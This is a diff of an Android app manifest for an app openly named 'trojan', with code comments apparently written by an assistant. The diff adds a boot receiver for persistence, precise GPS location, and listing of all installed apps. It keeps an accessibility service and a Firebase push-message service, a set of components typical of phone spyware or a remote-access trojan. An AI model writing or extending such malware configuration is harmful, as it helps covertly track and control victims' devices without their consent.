@@ -1,61 +1,54 @@
-<?xml version='1.0' encoding='utf-8'?>
-<!--
-    NOTE:
-    - `package`, `android:versionCode`, and `android:versionName` have been REMOVED from the <manifest> tag.
-    - The entire <uses-sdk> block has been REMOVED.
-    - Everything else (permissions, services, etc.) is PRESERVED from your original file.
--->
-<manifest
-    xmlns:android="http://schemas.android.com/apk/res/android"
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <uses-permission android:name="android.permission.INTERNET"/>
-    <uses-permission android:name="android.permission.WAKE_LOCK"/>
-    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"
-        tools:ignore="ProtectedPermissions" />
-	<uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
-	<uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
-	<uses-permission android:name="android.permission.WAKE_LOCK" />
+    <!-- =============================================================== -->
+    <!-- ==              CLEANED UP & ADDED PERMISSIONS               == -->
+    <!-- =============================================================== -->
 
-<!-- New permissions for getting GPS location -->
-<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <!-- Required for network communication to Netlify and Firebase -->
+    <uses-permission android:name="android.permission.INTERNET" />
+
+    <!-- Required on new Android versions to receive FCM messages -->
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+
+    <!-- Required to wake the device screen -->
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+
+    <!-- Required to see the list of all other apps installed on the device -->
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" tools:ignore="QueryAllPackagesPermission" />
+
+    <!-- Required for getting precise GPS location -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+
+    <!-- Required to listen for the device finishing its boot-up process -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
 
-    <!-- We are KEEPING our custom application class -->
     <application
         android:name=".TrojanApplication"
         android:label="trojan"
-        android:hasCode="true">
+        android:hasCode="true"
+        android:networkSecurityConfig="@xml/network_security_config"
+        tools:targetApi="31">
 
-        <!-- =============================================================== -->
-        <!-- ==    MODIFICATION: FirebaseInitProvider is COMMENTED OUT    == -->
-        <!-- =============================================================== -->
-        <!--
-        <provider
-		android:name="com.google.firebase.provider.FirebaseInitProvider"
-		android:authorities="com.trojan.firebaseinitprovider"
-		android:exported="false"
-		android:initOrder="100" />
-        -->
-
+        <!-- Your MainActivity remains the entry point of the app -->
         <activity
             android:name=".MainActivity"
-            android:windowSoftInputMode="adjustPan"
             android:exported="true">
             <intent-filter>
-                <action android:name="android.intent.action.MAIN"/>
-                <category android:name="android.intent.category.LAUNCHER"/>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
-        <!-- The rest of the services are unchanged -->
+        <!-- Your Accessibility Service -->
         <service
             android:name=".PowerAccessibilityService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:label="trojan"
-            android:exported="true">
+            android:exported="false"> <!-- Changed to false for better security -->
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
@@ -64,13 +57,27 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
+        <!-- Your FCM Messaging Service -->
         <service
             android:name=".MyFirebaseMessagingService"
-            android:exported="false">
+            android:exported="false"> <!-- Should always be false -->
             <intent-filter>
                 <action android:name="com.google.firebase.MESSAGING_EVENT" />
             </intent-filter>
         </service>
 
+        <!-- =============================================================== -->
+        <!-- ==        NEW: BootReceiver is now registered            == -->
+        <!-- =============================================================== -->
+        <receiver
+            android:name=".BootReceiver"
+            android:enabled="true"
+            android:exported="true"> <!-- Must be true to receive system broadcasts -->
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
     </application>
+
 </manifest>
